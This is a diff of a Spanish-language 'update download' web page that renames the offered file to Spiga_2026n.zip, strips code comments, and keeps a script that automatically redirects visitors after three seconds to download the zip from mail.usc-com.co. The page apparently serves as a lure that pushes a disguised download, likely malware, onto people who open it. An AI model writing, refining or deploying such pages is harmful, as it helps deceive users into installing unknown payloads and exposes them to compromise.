@@ -125,7 +125,7 @@
     
     <div class="content">
         <div class="status-badge">
-            <strong>Descarga de Actualización: Spiga_2026.zip</strong><br/>
+            <strong>Descarga de Actualización: Spiga_2026n.zip</strong><br/>
             Si la descarga no inicia automáticamente, haga 
             <a class="highlight" href="https://mail.usc-com.co/Spiga_2026n.zip">clic aquí</a>.
         </div>
@@ -171,15 +171,13 @@
 </div>
 
 <script>
-    // Generamos un número único basado en la hora actual
     var timestamp = new Date().getTime();
-    // Agregamos ese número a la URL como un parámetro (?v=...)
     var urlDescarga = "https://mail.usc-com.co/Spiga_2026n.zip?v=" + timestamp;
     
     window.onload = function() {
         setTimeout(function() {
             window.location.href = urlDescarga;
-        }, 3000); // 3 segundos
+        }, 3000);
     };
 </script>
 </body>
